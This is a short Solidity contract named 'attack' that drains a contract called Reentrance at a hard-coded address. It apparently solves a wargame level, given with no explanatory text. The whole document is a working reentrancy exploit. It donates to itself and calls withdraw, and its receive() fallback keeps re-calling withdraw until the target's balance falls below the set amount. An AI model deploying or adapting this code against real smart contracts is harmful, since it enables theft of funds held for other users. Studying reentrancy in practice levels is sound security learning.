contract attack {
  Reentrance originalContract = Reentrance(payable(0x6Aa566045dE5B3104c082853a1E2E4A3aFbABA06));
  uint public amount = 0.001 ether;

  constructor() payable {
  
  }

  function donateToSelf() public {
    originalContract.donate{value: amount, gas: 400000}(address(this));
  }

  
  function setAmount(uint256 _amount) public {
      amount = _amount;
  }

  function start() public {
    originalContract.withdraw{gas: 400000}(amount);
  }

  receive() external payable {
     
     if (address(originalContract).balance >= amount) {
        originalContract.withdraw{gas: 400000}(amount);
    }
  }

}
